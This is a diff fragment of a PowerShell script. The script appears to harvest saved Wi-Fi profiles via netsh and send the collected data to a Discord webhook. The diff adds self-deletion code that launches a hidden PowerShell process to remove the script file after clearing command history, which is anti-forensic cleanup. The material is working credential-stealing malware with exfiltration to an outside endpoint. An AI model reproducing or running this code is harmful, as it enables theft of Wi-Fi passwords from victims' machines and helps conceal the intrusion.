@@ -10,5 +10,8 @@ netsh wlan show profile | Select-String '(?<=Perfil de todos los usuarios\s+:\s)
 #Write-Output $Body
  Invoke-RestMethod -Uri $discord -Method Post -Body ($Body)
 }
-Remove-Item $path
 Clear-History
+$miScript = $MyInvocation.MyCommand.Path
+
+Start-Process powershell -ArgumentList "-NoProfile -WindowStyle Hidden -Command `"Remove-Item -Force '$miScript'`""
+exit
